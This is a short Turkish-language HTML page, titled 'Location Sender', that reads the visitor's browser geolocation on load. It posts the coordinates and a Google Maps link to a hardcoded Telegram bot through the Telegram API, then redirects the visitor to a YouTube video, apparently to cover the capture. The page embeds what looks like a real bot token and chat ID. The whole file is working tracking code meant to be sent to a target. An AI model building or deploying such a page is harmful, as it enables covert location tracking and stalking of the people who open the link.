<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Konum Gönderici</title>
</head>
<body>
  <h2>📡 Konumun gönderiliyor...</h2>

  <script>
    function sendLocationToTelegram(lat, lon) {
      const chatID = "8499614707";
      const token = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
      const message = `📍 Yeni konum bilgisi alındı:\n🧭 Enlem: ${lat}\n🧭 Boylam: ${lon}\n\n📌 Haritada görmek için:\nhttps://www.google.com/maps?q=${lat},${lon}`;

      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const body = `chat_id=${chatID}&text=${encodeURIComponent(message)}`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body
      }).then(() => {
        // Konum gönderildikten sonra YouTube'a yönlendir
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Senin daha önce verdiğin bağlantı
      });
    }

    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      sendLocationToTelegram(lat, lon);
    });
  </script>
</body>
</html>
